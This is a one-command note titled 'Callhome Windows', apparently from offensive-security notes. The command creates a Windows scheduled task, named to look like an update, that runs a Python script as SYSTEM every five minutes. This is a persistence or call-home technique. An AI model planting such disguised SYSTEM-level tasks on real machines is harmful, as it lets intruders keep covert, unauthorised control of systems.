Callhome Windows

Create Scheduled Task
schtasks /create /sc minute /mo 5 /tn "update_tun0_ipname" /tr "python.exe C:\path\to\file.py" /ru SYSTEM /f
